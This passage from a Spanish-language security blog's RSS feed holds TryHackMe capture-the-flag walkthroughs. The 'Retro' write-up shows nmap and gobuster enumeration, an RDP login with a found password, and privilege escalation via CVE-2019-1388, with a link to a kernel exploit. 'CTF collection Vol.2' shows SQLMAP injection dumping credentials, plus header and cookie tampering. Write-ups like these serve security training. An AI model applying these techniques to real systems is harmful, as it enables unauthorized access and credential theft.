&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Thu Feb 13 16:45:26 2020 as: nmap -p- -T4 -Pn -sV -sC -o nmap_scan 10.10.69.12&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.69.12
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;RetroWeb
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2019-12-07T23:49:24
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2020-06-07T23:49:24
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2020-02-13T22:50:58+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; -1s from scanner time.
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Feb 13 16:50:59 2020 -- 1 IP address (1 host up) scanned in 333.22 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/retro# gobuster dir -u 10.10.69.12 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -q -t &lt;span class=&#34;m&#34;&gt;105&lt;/span&gt; -x php,asp,aspx,txt,html
/retro &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;retro&#34;&gt;/retro&lt;/h4&gt;
&lt;p&gt;Dentro de la pagina encontramos un post el cual contiene un comentario del usuario wade.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/retro/Screenshot_20200213_171656.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rdp---user&#34;&gt;RDP - User&lt;/h2&gt;
&lt;p&gt;Consideramos que &amp;lsquo;parzival&amp;rsquo; es una contraseña del usuario wade, utilizamos el servicio RDP de la maquina para utilizar esta informacion. Utilizamos vinagre para conectarnos a la maquina. Obtenemos nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/retro/Screenshot_20200213_171945.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Enumeramos la maquina y vemos en el historial un CVE que el usuario estuvo buscando ademas de eso un archivo en la papelera de reciclaje. Investigamos que podria ser este archivo y encontramos que es utilizado para obtener privilegios de administracion en el &lt;code&gt;CVE-2019-1388&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/retro/Screenshot_20200213_173213.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/jas502n/CVE-2019-1388&#34;&gt;&lt;strong&gt;CVE-2019-1388&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/retro/Screenshot_20200213_172457.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Seguimos los pasos que nos indican en github, en caso de que no podamos realizar los pasos podemos utilizar el siguiente exploit:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip&#34;&gt;&lt;strong&gt;https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Build 14393:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/retro/Screenshot_20200213_180051.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos nuestra shell como usuario administrator y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/retro/Screenshot_20200213_175701.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/retro/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/retro/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - CTF collection Vol.2</title>
        <link>https://sckull.github.io/posts/ctf_collection_vol2/</link>
        <pubDate>Fri, 14 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 14 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/ctf_collection_vol2/</guid>
        <description>CTF Collection Vol.2 es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.</description>
        <content:encoded>&lt;p&gt;CTF Collection Vol.2 es una serie de retos de TryHackMe aqui encontrarás la solucion para obtener las flags.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;CTF collection Vol.2&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Sharpening up your CTF skill with the collection. The second volume is about web-based CTF.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;3492&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DesKel&#34;&gt;Deskel&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/ctfvolcollection2# gobuster dir -u http://10.10.51.83/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t &lt;span class=&#34;m&#34;&gt;35&lt;/span&gt; -x php,html,txt
/button &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cgi-bin/ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cgi-bin/.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/iphone &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/small &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/static &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@aoiri:~/tryhackme/ctfvolcollection2#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;easter-1&#34;&gt;Easter 1&lt;/h2&gt;
&lt;p&gt;La maquina esta diseñada para ser explotada via web para obtener las flags. Desde este punto de vista utilizamos gobuster para obtener los directorios, como siempre, revisamos el archivo &lt;code&gt;robots.txt&lt;/code&gt; donde vemos una cadena en hexadecimal.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_003107.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos CyberChef para obtener nuestra flag:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_003130.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-2&#34;&gt;Easter 2&lt;/h2&gt;
&lt;p&gt;Revisamos el archivo &lt;code&gt;robots.txt&lt;/code&gt; nuevamente, donde vemos una URL codificada.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_002340.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos CyberChef para poder decodificar la cadena y obtener nuestra flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Base64 &amp;gt; URL decode &amp;gt; Base64 &amp;gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Remove spaces&amp;#34;&lt;/span&gt; &amp;gt; Base64 &amp;gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Remove spaces&amp;#34;&lt;/span&gt; &amp;gt; Base64
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Visitamos la url que logramos decodificar, obtenemos nuestra flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_002901.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-3&#34;&gt;Easter 3&lt;/h2&gt;
&lt;p&gt;En el codigo fuente de &lt;strong&gt;/login&lt;/strong&gt; encontramos nuestra flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_011106.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-4&#34;&gt;Easter 4&lt;/h2&gt;
&lt;p&gt;En la pagina &lt;strong&gt;/login&lt;/strong&gt; encontramos un formulario, capturamos los datos del metodo POST y utilizamos SQLMAP para realizar una inyeccion SQL POST. Obtenemos la contraseña de DesKel y la crackeamos con &lt;a href=&#34;https://md5hashing.net/&#34;&gt;&lt;strong&gt;md5hashing&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Database: THM_f0und_m3
Table: nothing_inside
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; entry&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+-------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Easter_4                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+-------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; THM&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; ... snip ... &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+-------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;easter-5&#34;&gt;Easter 5&lt;/h2&gt;
&lt;p&gt;De la misma forma obtenemos los datos de la base de datos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Database: THM_f0und_m3
Table: user
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; entries&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+----------+------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; username &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; password                           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----------+------------------------------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; DesKel   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 05f3672ba&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;0070d1b     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Skidy    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; He is a nice guy, say hello &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; me &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----------+------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_021756.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-6&#34;&gt;Easter 6&lt;/h2&gt;
&lt;p&gt;Vemos los headers de la pagina principal.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_005502.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-7&#34;&gt;Easter 7&lt;/h2&gt;
&lt;p&gt;Utilizamos el cookie Invited y con burpsuite le pasamos un numero, al ingresar el numero correcto obtenemos nuestra flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_005306.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-8&#34;&gt;Easter 8&lt;/h2&gt;
&lt;p&gt;Utilizamos los headers de Iphone.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_005616.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_005714.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-9&#34;&gt;Easter 9&lt;/h2&gt;
&lt;p&gt;Visitamos la pagina &lt;strong&gt;/ready&lt;/strong&gt; y vemos el codigo fuente donde encontramos la flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_003232.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-10&#34;&gt;Easter 10&lt;/h2&gt;
&lt;p&gt;Debemos reclamar nuestro voucher.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_005821.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Solucion, referenciamos hacia tryhackme.com en los headers:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_010015.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-11&#34;&gt;Easter 11&lt;/h2&gt;
&lt;p&gt;En las opciones de la pagina principal vemos cuatro, pero vemos que &amp;ldquo;Deskel&amp;rdquo; prefiere huevo (egg). Enviamos egg en lugar de las opciones disponibles.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_010143.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_010338.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-12&#34;&gt;Easter 12&lt;/h2&gt;
&lt;p&gt;En el codigo javascript de la pagina encontramos una funcion, la ejecutamos para obtener nuestra flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_010628.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-13&#34;&gt;Easter 13&lt;/h2&gt;
&lt;p&gt;El reto 9 nos lleva al 13, la misma dinamica, el codigo fuente.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_003324.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-14&#34;&gt;Easter 14&lt;/h2&gt;
&lt;p&gt;En el codigo fuente de la pagina principal vemos un comentario que contiene una imagen codificada en base64. Renderizamos la imagen o descomentamos el comentario para obtener la flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_004634.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_004651.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-15&#34;&gt;Easter 15&lt;/h2&gt;
&lt;p&gt;En la pagina &lt;strong&gt;/game1&lt;/strong&gt; vemos un formulario con una pista. Utilizamos Burpsuite para insertar letras del abecedario, vemos el resultado de cada una de las letras que se muestran en &amp;ldquo;Your Hash&amp;rdquo; para poder comparar los datos (hash) con la pista (hash) que nos muestra en la pagina.&lt;/p&gt;
&lt;p&gt;Si ingresamos la letra &amp;ldquo;Z&amp;rdquo; y el resultado es &amp;ldquo;1000&amp;rdquo;, comparamos el resultado con la pista, si el resultado es igual que al de la pista tenemos nuestra primera letra &amp;ldquo;Z&amp;rdquo;. Repetimos hasta tener el resultado.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_003635.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Resultado de &lt;code&gt;51 89 77 93 126 14 93 10&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_004125.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-16&#34;&gt;Easter 16&lt;/h2&gt;
&lt;p&gt;En la pagina &lt;strong&gt;/game2&lt;/strong&gt; debemos de presionar los tres botones al mismo tiempo, editamos el HTML para convertir los formularios en uno solo y damos click a un boton.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_004232.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_004404.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;easter-17&#34;&gt;Easter 17&lt;/h2&gt;
&lt;p&gt;Encontramos un script en la pagina principal en binario.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol2/Screenshot_20200214_004725.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Binary &amp;gt; Hex &amp;gt; Text
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://www.rapidtables.com/convert/number/binary-to-hex.html&#34;&gt;&lt;strong&gt;Binary &amp;gt; Hex&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
